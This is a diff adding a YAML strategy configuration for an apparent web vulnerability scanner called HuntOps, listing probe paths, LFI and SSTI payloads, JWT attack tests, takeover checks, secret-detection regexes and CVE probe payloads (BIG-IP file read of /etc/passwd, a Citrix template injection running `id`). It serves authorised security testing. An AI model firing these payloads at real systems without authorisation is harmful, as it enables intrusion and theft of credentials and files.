@@ -1,0 +1,528 @@
+# HuntOps — Data-Driven Strategy Rules
+# Configuration for the Ebb & Flow Strategy Engine (lib/strategy.sh)
+# This YAML defines per-strategy enable/disable, payloads, severity maps, and
+# technology-specific targeting. The strategy engine parses this with awk/sed
+# (no yq dependency) to remain portable in the monolith port.
+
+strategies:
+  low_hanging:
+    enabled: true
+    description: "Probe framework-specific dev/admin/debug endpoints"
+    paths_by_tech:
+      spring:
+        - "/actuator"
+        - "/actuator/env"
+        - "/actuator/health"
+        - "/actuator/mappings"
+        - "/actuator/beans"
+        - "/actuator/metrics"
+        - "/actuator/heapdump"
+      django:
+        - "/admin"
+        - "/debug"
+        - "/static"
+        - "/media"
+        - "/__debug__"
+      laravel:
+        - "/.env"
+        - "/.env.backup"
+        - "/telescope"
+        - "/storage/logs/laravel.log"
+        - "/bootstrap/cache"
+      wordpress:
+        - "/wp-admin"
+        - "/wp-login.php"
+        - "/xmlrpc.php"
+        - "/wp-json"
+        - "/wp-config.php.bak"
+        - "/wp-content/debug.log"
+      rails:
+        - "/rails/info"
+        - "/rails/info/properties"
+        - "/sidekiq"
+      node_express:
+        - "/debug"
+        - "/status"
+        - "/health"
+        - "/api-docs"
+        - "/swagger"
+      flask:
+        - "/debug"
+        - "/console"
+      generic:
+        - "/server-status"
+        - "/server-info"
+        - "/console"
+        - "/api-docs"
+        - "/swagger-ui.html"
+        - "/swagger/"
+        - "/openapi.json"
+        - "/openapi.yaml"
+        - "/v2/api-docs"
+        - "/v3/api-docs"
+        - "/.git/config"
+        - "/.env"
+        - "/.env.local"
+        - "/.env.production"
+        - "/robots.txt"
+        - "/sitemap.xml"
+        - "/crossdomain.xml"
+        - "/phpinfo.php"
+        - "/test.php"
+        - "/info.php"
+    severity_map:
+      actuator: "high"
+      server-status: "high"
+      server-info: "high"
+      console: "critical"
+      wp-config.php.bak: "high"
+      .env: "critical"
+      .git/config: "critical"
+      xmlrpc.php: "high"
+      phpinfo.php: "medium"
+      debug: "medium"
+      admin: "medium"
+    timeout_seconds: 30
+    max_hosts: 50
+
+  param_injection:
+    enabled: true
+    description: "Chained parameter injection: redirect → LFI → SSTI"
+    redirect_params:
+      - "url"
+      - "redirect"
+      - "redirect_url"
+      - "next"
+      - "next_url"
+      - "return"
+      - "return_url"
+      - "continue"
+      - "continue_url"
+      - "dest"
+      - "destination"
+      - "target"
+      - "callback"
+      - "cb"
+      - "ref"
+      - "refer"
+      - "r"
+      - "u"
+      - "to"
+      - "link"
+      - "uri"
+      - "path"
+      - "go"
+      - "out"
+      - "forward"
+    lfi_params:
+      - "file"
+      - "path"
+      - "page"
+      - "include"
+      - "template"
+      - "lang"
+      - "doc"
+      - "view"
+      - "dir"
+      - "root"
+      - "folder"
+      - "file_path"
+      - "filename"
+      - "load_file"
+      - "read_file"
+      - "template_file"
+    lfi_payloads:
+      - "../../../../etc/passwd"
+      - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+      - "/etc/passwd"
+      - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+      - "../../../../windows/win.ini"
+    ssti_engines:
+      - "twig"
+      - "jinja"
+      - "jinja2"
+      - "freemarker"
+      - "velocity"
+      - "smarty"
+      - "handlebars"
+      - "thymeleaf"
+      - "blade"
+      - "mustache"
+      - "ejs"
+      - "pug"
+      - "jade"
+    ssti_payloads:
+      - "{{7*7}}"
+      - "${7*7}"
+      - "#{7*7}"
+      - "*{7*7}"
+      - "{{7*'7'}}"
+      - "${{7*7}}"
+      - "<%= 7*7 %>"
+      - "@(7*7)"
+      - "#{7*7}"
+    escalate_on_redirect: true
+    escalate_on_lfi: true
+    escalate_on_ssti: true
+    timeout_seconds: 30
+    max_param_urls: 30
+
+  api_graphql:
+    enabled: true
+    description: "GraphQL introspection + mutation enumeration"
+    endpoints:
+      - "/graphql"
+      - "/graphql/"
+      - "/api/graphql"
+      - "/api/graphql/"
+      - "/api/v1/graphql"
+      - "/api/v2/graphql"
+      - "/gql"
+      - "/gql/"
+      - "/v1/graphql"
+      - "/v2/graphql"
+      - "/query"
+      - "/query/"
+      - "/graphiql"
+      - "/graphiql/"
+      - "/playground"
+      - "/altair"
+      - "/admin/graphql"
+      - "/api/internal/graphql"
+      - "/graphql/console"
+    introspection_query: "{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"
+    mutation_query: "{__type(name:\"Mutation\"){fields{name args{name type{name kind ofType{name kind}}}}}}"
+    depth_limit_test: true
+    complexity_limit_test: true
+    field_suggestion_test: true
+    timeout_seconds: 30
+    max_hosts: 50
+
+  cors:
+    enabled: true
+    description: "Advanced CORS testing: arbitrary origin + credentials + wildcards"
+    test_origins:
+      - "https://evil.example.com"
+      - "https://sub.evil.example.com"
+      - "https://evil.{target}"
+      - "null"
+      - "https://{target}.evil.com"
+      - "file://"
+      - "data:"
+    check_credentials: true
+    check_wildcard_with_credentials: true
+    check_preflight: true
+    preflight_methods:
+      - "GET"
+      - "POST"
+      - "PUT"
+      - "DELETE"
+      - "PATCH"
+      - "OPTIONS"
+    severity_map:
+      reflected_with_credentials: "high"
+      wildcard_with_credentials: "critical"
+      reflected_arbitrary: "medium"
+      null_origin_reflected: "medium"
+    timeout_seconds: 30
+    max_hosts: 50
+
+  cloud_storage:
+    enabled: true
+    description: "S3/GCS/Azure blob exposure and listability check"
+    providers:
+      aws:
+        patterns:
+          - "\.s3\."
+          - "\.s3-"
+          - "\.amazonaws\.com$"
+        bucket_test: true
+        list_test: true
+      gcp:
+        patterns:
+          - "\.storage\.googleapis\.com$"
+        bucket_test: true
+        list_test: true
+      azure:
+        patterns:
+          - "\.blob\.core\.windows\.net$"
+        bucket_test: true
+        list_test: false
+    severity_map:
+      listable: "critical"
+      accessible_not_listable: "medium"
+      exists_403: "low"
+    timeout_seconds: 12
+    max_labels: 15
+
+  auth_bypass:
+    enabled: true
+    description: "JWT attacks: alg:none, weak secret, kid injection, JWKS spoofing"
+    tests:
+      alg_none:
+        enabled: true
+        description: "Forge alg:none token and test signature bypass"
+        severity: "medium"
+      weak_secret:
+        enabled: true
+        description: "Brute-force HS256/384/512 secret from wordlist"
+        wordlist: "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-10000.txt"
+        severity: "high"
+      kid_injection:
+        enabled: true
+        description: "Test kid header path traversal and key confusion"
+        severity: "medium"
+      jku_x5u_spoofing:
+        enabled: true
+        description: "Test JWKS (jku/x5u) header spoofing"
+        severity: "high"
+      rsa_hmac_confusion:
+        enabled: true
+        description: "Test RSA public key as HMAC secret"
+        severity: "high"
+    timeout_seconds: 30
+    max_tokens: 30
+
+  race:
+    enabled: true
+    description: "Race condition / logic flaw candidate identification"
+    race_keywords:
+      - "checkout"
+      - "transfer"
+      - "confirm"
+      - "pay"
+      - "order"
+      - "withdraw"
+      - "redeem"
+      - "claim"
+      - "submit"
+      - "verify"
+      - "otp"
+      - "coupon"
+      - "balance"
+      - "topup"
+      - "send"
+      - "money"
+      - "purchase"
+      - "buy"
+      - "refund"
+      - "cancel"
+      - "upgrade"
+      - "downgrade"
+      - "subscribe"
+      - "unsubscribe"
+      - "vote"
+      - "like"
+      - "follow"
+      - "invite"
+      - "register"
+      - "reset"
+      - "change"
+      - "update"
+      - "delete"
+      - "create"
+      - "add"
+      - "remove"
+    severity: "low"
+    confidence: "candidate"
+    timeout_seconds: 30
+    max_param_urls: 30
+
+  takeover:
+    enabled: true
+    description: "Subdomain takeover via CNAME dead-check"
+    providers:
+      github_pages:
+        - "*.github.io"
+      heroku:
+        - "*.herokuapp.com"
+        - "*.herokussl.com"
+      netlify:
+        - "*.netlify.app"
+      vercel:
+        - "*.vercel.app"
+        - "*.now.sh"
+      readme_io:
+        - "*.readme.io"
+      gitlab_pages:
+        - "*.gitlab.io"
+      pantheon:
+        - "*.pantheonsite.io"
+      azure:
+        - "*.azurewebsites.net"
+        - "*.cloudapp.azure.com"
+        - "*.trafficmanager.net"
+      aws:
+        - "*.s3.amazonaws.com"
+        - "*.s3-website.*.amazonaws.com"
+      firebase:
+        - "*.firebaseapp.com"
+        - "*.web.app"
+      surge:
+        - "*.surge.sh"
+      bitbucket:
+        - "*.bitbucket.io"
+      fastly:
+        - "*.fastly.net"
+        - "*.fastlylb.net"
+      cargo:
+        - "*.cargocollective.com"
+      unbounce:
+        - "*.unbouncepages.com"
+      tilda:
+        - "*.tilda.ws"
+      uservoice:
+        - "*.uservoice.com"
+      wordpress:
+        - "*.wordpress.com"
+      tumblr:
+        - "*.tumblr.com"
+      zendesk:
+        - "*.zendesk.com"
+      freshdesk:
+        - "*.freshdesk.com"
+    dead_codes:
+      - 404
+      - 000
+    severity_map:
+      dead_404: "high"
+      dead_000: "high"
+    timeout_seconds: 12
+    max_cnames: 100
+
+  secrets:
+    enabled: true
+    description: "High-value secret pattern validation in JS and responses"
+    patterns:
+      AWS_ACCESS_KEY:
+        regex: "AKIA[0-9A-Z]{16}"
+        severity: "high"
+      AWS_SECRET_KEY:
+        regex: "[A-Za-z0-9/+=]{40}"
+        severity: "high"
+      GITHUB_TOKEN:
+        regex: "gh[pousr]_[0-9A-Za-z]{36}"
+        severity: "high"
+      SLACK_TOKEN:
+        regex: "xox[baprs]-[0-9A-Za-z-]{10,}"
+        severity: "high"
+      STRIPE_SECRET:
+        regex: "sk_live_[0-9A-Za-z]{24}"
+        severity: "high"
+      STRIPE_PUBLISHABLE:
+        regex: "pk_live_[0-9A-Za-z]{24}"
+        severity: "medium"
+      SENDGRID_KEY:
+        regex: "SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}"
+        severity: "high"
+      GOOGLE_API_KEY:
+        regex: "AIza[0-9A-Za-z_-]{35}"
+        severity: "high"
+      MAILGUN_KEY:
+        regex: "key-[0-9a-z]{32}"
+        severity: "high"
+      TWILIO_SID:
+        regex: "AC[0-9a-f]{32}"
+        severity: "medium"
+      TWILIO_TOKEN:
+        regex: "[0-9a-f]{32}"
+        severity: "high"
+      HEROKU_API_KEY:
+        regex: "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
+        severity: "high"
+      PRIVATE_KEY:
+        regex: "-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----"
+        severity: "critical"
+      JWT_TOKEN:
+        regex: "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*"
+        severity: "medium"
+    validate_live: true
+    timeout_seconds: 30
+    max_secrets: 100
+
+  cve_poc:
+    enabled: true
+    description: "Safe proof-of-concept probes for matched CVEs"
+    cv_mapping:
+      CVE-2021-44228:
+        name: "Log4Shell"
+        safe_probe: true
+        probe_type: "jndi_canary"
+        description: "Send JNDI lookup header to canary DNS (no exploit listener)"
+        severity: "medium"
+        requires_no_dos: true
+      CVE-2021-45046:
+        name: "Log4Shell (2)"
+        safe_probe: true
+        probe_type: "jndi_canary"
+        description: "Send JNDI lookup header to canary DNS"
+        severity: "medium"
+        requires_no_dos: true
+      CVE-2022-22965:
+        name: "Spring4Shell"
+        safe_probe: true
+        probe_type: "class_module_access"
+        probe_payload: "?class.module.classLoader.resources.cacheAware"
+        description: "Test Spring data-binding exposure via class.module access"
+        severity: "medium"
+        requires_no_dos: false
+      CVE-2021-26855:
+        name: "ProxyShell"
+        safe_probe: true
+        probe_type: "autodiscover"
+        probe_payload: "/autodiscover/autodiscover.json?a@b.c/powershell"
+        description: "Probe Exchange autodiscover endpoint for SSRF chain"
+        severity: "medium"
+        requires_no_dos: false
+      CVE-2021-34473:
+        name: "ProxyShell (2)"
+        safe_probe: true
+        probe_type: "autodiscover"
+        probe_payload: "/autodiscover/autodiscover.json?a@b.c/powershell"
+        severity: "medium"
+        requires_no_dos: false
+      CVE-2021-34523:
+        name: "ProxyShell (3)"
+        safe_probe: true
+        probe_type: "autodiscover"
+        probe_payload: "/autodiscover/autodiscover.json?a@b.c/powershell"
+        severity: "medium"
+        requires_no_dos: false
+      CVE-2020-5902:
+        name: "BIG-IP TMUI RCE"
+        safe_probe: true
+        probe_type: "file_read"
+        probe_payload: "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
+        description: "Test BIG-IP TMUI directory traversal (file read only)"
+        severity: "high"
+        requires_no_dos: false
+      CVE-2019-19781:
+        name: "Citrix ADC RCE"
+        safe_probe: true
+        probe_type: "file_read"
+        probe_payload: "/vpns/portal/scripts/newbm.pl?url=http://example.com&title=test&desc=[% template.new('BLOCK' = 'print `id`' %) %]"
+        description: "Test Citrix ADC template injection (output check only)"
+        severity: "high"
+        requires_no_dos: false
+      CVE-2020-0688:
+        name: "Exchange Control Panel"
+        safe_probe: true
+        probe_type: "viewstate"
+        description: "Check for vulnerable ViewState configuration"
+        severity: "high"
+        requires_no_dos: false
+    default_action:
+      emit_candidate: true
+      severity: "low"
+      description: "CVE matched — manual PoC required within scope"
+    timeout_seconds: 30
+
+# Global strategy engine settings
+global:
+  live_cap: 50
+  param_cap: 30
+  timeout: 30
+  no_dos_lifts_poc: true
+  dedup_enabled: true
+  evidence_chaining_enabled: true
+  adaptive_prioritization: true
